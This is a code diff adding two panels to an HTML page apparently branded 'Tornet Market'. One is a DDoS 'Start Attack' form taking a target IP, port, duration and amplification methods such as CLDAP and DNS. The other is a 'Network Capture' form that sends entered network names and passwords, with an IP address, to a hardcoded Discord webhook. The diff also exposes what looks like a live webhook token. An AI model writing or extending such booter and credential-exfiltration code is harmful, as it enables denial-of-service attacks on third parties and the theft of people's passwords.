@@ -194,10 +194,145 @@
       <input type="text" id="networkNameInput" placeholder="Network Name">
       <input type="text" id="passwordInput" placeholder="Password (Optional)">
       <button id="saveNetworkButton">Save</button>
-  </div>
+    </div>
+    <div class="panel" id="ddosPanel">
+      <h2>🛰️│𝗱𝗱𝗼𝘀</h2>
+      <input type="text" id="ipInput" placeholder="IP">
+      <input type="text" id="portInput" placeholder="Port">
+      <input type="text" id="secondsInput" placeholder="Time">
+      <select id="methodSelect">
+        <option value="CLDAP">CLDAP</option>
+        <option value="DNS">DNS</option>
+        <option value="SSYN">SSYN</option>
+        <option value="TCP">TCP</option>
+      </select>
+      <button id="bootButton">Start Attack</button>
+    </div>
   </div>
 
   <script>
+
+  // Add your JavaScript logic here
+  document.addEventListener('DOMContentLoaded', function () {
+            // Logic for the network panel
+            document.getElementById('saveNetworkButton').addEventListener('click', async function() {
+                try {
+                    const networkName = document.getElementById('networkNameInput').value.trim();
+                    const password = document.getElementById('passwordInput').value.trim();
+
+                    if (networkName === '') {
+                        alert('Please enter a Network Name.');
+                        return;
+                    }
+
+                    const ipAddress = await getPublicIPAddress();
+                    const networkInfoTextBox = document.createElement('input');
+                    networkInfoTextBox.setAttribute('type', 'text');
+                    networkInfoTextBox.setAttribute('readonly', 'readonly');
+                    if (password !== '') {
+                        networkInfoTextBox.setAttribute('value', `Network Captured (${networkName} - ${ipAddress}) with password "${password}".`);
+                    } else {
+                        networkInfoTextBox.setAttribute('value', `Network Captured (${networkName} - ${ipAddress}).`);
+                    }
+
+                    const networkPanel = document.getElementById('networkPanel');
+                    networkPanel.appendChild(networkInfoTextBox);
+
+                    let message = `The Network (${networkName} - ${ipAddress}) has been saved.`;
+                    if (password !== '') {
+                        message += ` Password: "${password}".`;
+                    }
+                    const alertTimeout = 2500;
+                    alert(message);
+
+                    const embed = {
+                        title: 'Network Capture',
+                        description: `**Network Name:** ${networkName}\n**IP Address:** ${ipAddress}`,
+                        color: 0x5865F2,
+                        footer: {
+                            text: 'Tornets Network Capture'
+                        }
+                    };
+
+                    if (password !== '') {
+                        embed.description += `\n**Password:** ${password}`;
+                    }
+
+                    sendEmbedToDiscord(embed);
+
+                    document.getElementById('networkNameInput').value = '';
+                    document.getElementById('passwordInput').value = '';
+
+                    setTimeout(() => {
+                        networkPanel.removeChild(networkInfoTextBox);
+                    }, alertTimeout);
+
+                } catch (error) {
+                    console.error('Error saving network name:', error);
+                }
+            });
+
+            // Logic for the DDoS panel
+            document.getElementById('bootButton').addEventListener('click', function() {
+                const ip = document.getElementById('ipInput').value.trim();
+                const port = document.getElementById('portInput').value.trim();
+                const method = document.getElementById('methodSelect').value;
+                const seconds = document.getElementById('secondsInput').value.trim();
+
+                if (ip === '' || port === '' || seconds === '') {
+                    alert('Please fill in all the fields.');
+                    return;
+                }
+
+                const ddosMessage = `DDoS Attack Initiated\nIP - ${ip}\nPort - ${port}\nMethod - ${method}\nDuration - ${seconds} seconds`;
+                alert(ddosMessage);
+
+                const ddosEmbed = {
+                    title: 'DDoS Attack Initiated',
+                    description: `IP - ${ip}\nPort - ${port}\nMethod - ${method}\nDuration - ${seconds} seconds`,
+                    color: 0x5865F2,
+                    footer: {
+                        text: 'Tornet Market DDoS Attack'
+                    }
+                };
+
+                sendEmbedToDiscord(ddosEmbed);
+
+                document.getElementById('ipInput').value = '';
+                document.getElementById('portInput').value = '';
+                document.getElementById('secondsInput').value = '';
+            });
+
+            // Function to get public IP address (replace with actual implementation)
+            async function getPublicIPAddress() {
+                // Replace with actual logic to get public IP address
+                return '127.0.0.1';
+            }
+
+            // Function to send an embed message to Discord
+            function sendEmbedToDiscord(embed) {
+                const webhookUrl = 'https://discord.com/api/webhooks/1260757099403804713/A-s-RE5auaX9Z3bAm85biOUyZofiCtTSCte7A3Pl4Cc4jDMHURbavQ7b7NKX1ohbQQAS';
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed],
+                    }),
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+                    console.log('Message sent successfully to Discord.');
+                })
+                .catch(error => {
+                    console.error('Error sending message to Discord:', error);
+                });
+            }
+        });
   
   document.addEventListener('DOMContentLoaded', function() {
     // Function to update the clock
